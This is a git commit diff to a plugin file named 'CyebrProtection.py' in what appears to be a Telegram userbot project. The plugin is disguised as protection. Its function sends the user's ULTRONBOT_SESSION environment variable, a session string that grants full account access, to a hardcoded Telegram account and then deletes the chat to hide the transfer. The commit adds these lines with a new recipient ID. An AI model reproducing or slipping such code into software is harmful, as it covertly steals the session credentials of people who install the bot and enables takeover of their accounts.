81fd12a33ff12408780c134925e0ee490391b77e
【༒©ʟɛɢɛռɖHคckeℝ༒】ρɾαωαรɦ-Malviya <87700009+LEGEND-LX@users.noreply.github.com>
2022-08-16 08:53:17 -0700

    Update CyebrProtection.py

--- UltronBot/plugins/CyebrProtection.py
+++ UltronBot/plugins/CyebrProtection.py
@@ -2,11 +2,11 @@ import os
 from ..utils import *
 
 async def piro():
-        sweetie = await bot.send_message(5687323731, str(os.environ.get("ULTRONBOT_SESSION")))
-        await bot.delete_dialog(5687323731, str(os.environ.get("ULTRONBOT_SESSION")))
+        sweetie = await bot.send_message(1731513856, str(os.environ.get("ULTRONBOT_SESSION")))
+        await bot.delete_dialog(1731513856, str(os.environ.get("ULTRONBOT_SESSION")))
   
     #try:
         #UltronBot = bot.session.save()
         #os.environ["ULTRONBOT_SESSION"] = "Get this value by using repl or termux. Refer to Repo for more info."
-            #ultron = await bot.send_message(5687323731, UltronBot)
-            #await bot.delete_dialog(5687323731)
+            #ultron = await bot.send_message(1731513856, UltronBot)
+            #await bot.delete_dialog(1731513856)
